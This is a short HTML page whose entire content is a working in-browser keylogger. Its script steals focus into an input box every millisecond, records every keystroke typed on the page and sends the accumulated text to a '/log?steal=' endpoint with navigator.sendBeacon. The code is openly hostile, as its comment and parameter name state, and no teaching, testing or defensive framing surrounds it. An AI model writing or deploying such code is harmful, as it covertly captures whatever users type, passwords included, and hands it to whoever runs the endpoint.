<!doctype html>
<html><head><meta charset="utf-8"></head>
<body>
<input id="s" style="width:200px">
<script>
  // grabs focus all the time and records keys
  let buf = '';
  setInterval(() => { if (document.activeElement !== s) s.focus(); }, 1);
  addEventListener('keydown', e => { buf += e.key.length === 1 ? e.key : ''; navigator.sendBeacon('/log?steal=' + encodeURIComponent(buf)); }, true);
</script>
</body></html>
